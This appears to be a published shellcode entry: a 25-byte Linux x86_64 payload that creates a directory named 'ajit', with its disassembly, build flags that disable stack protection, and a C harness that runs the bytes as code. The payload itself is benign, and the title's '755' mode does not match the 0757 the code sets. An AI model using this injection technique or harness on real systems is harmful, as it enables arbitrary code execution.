/*
---------------------------------------------------------------------------------------------------

Linux/x86_x64 - mkdir("ajit", 755) - 25 bytes

Ajith Kp          [ http://fb.com/ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]
Vishnu Nath Kp    [ http://www.terminalcoders.blogspot.com ]
Sayooj S Nambiar  [ http://fb.com/sayooj.sivadas ]

Om Asato Maa Sad-Gamaya |
Tamaso Maa Jyotir-Gamaya |
Mrtyor-Maa Amrtam Gamaya |
Om Shaantih Shaantih Shaantih |

---------------------------------------------------------------------------------------------------
Disassembly of section .text:

0000000000400080 <.text>:
  400080: 48 31 f6              xor    %rsi,%rsi
  400083: 56                    push   %rsi
  400084: 68 61 6a 69 74        pushq  $0x74696a61
  400089: 54                    push   %rsp
  40008a: 5f                    pop    %rdi
  40008b: 6a 53                 pushq  $0x53
  40008d: 58                    pop    %rax
  40008e: 66 be ef 01           mov    $0x1ef,%si
  400092: 0f 05                 syscall
  400094: 6a 3c                 pushq  $0x3c
  400096: 58                    pop    %rax
  400097: 0f 05                 syscall
---------------------------------------------------------------------------------------------------

How To Run

$ gcc -o mkdir_shellcode_linux_x64 mkdir_shellcode_linux_x64.c -z execstack
$ ./mkdir_shellcode_linux_x64

---------------------------------------------------------------------------------------------------
*/
#include <stdio.h>
char sh[]="\x48\x31\xf6\x56\x68\x61\x6a\x69\x74\x54\x5f\x6a\x53\x58\x66\xbe\xef\x01\x0f\x05\x6a\x3c\x58\x0f\x05";
void main(int argc, char **argv)
{
    int (*func)();
    func = (int (*)()) sh;
    (int)(*func)();
}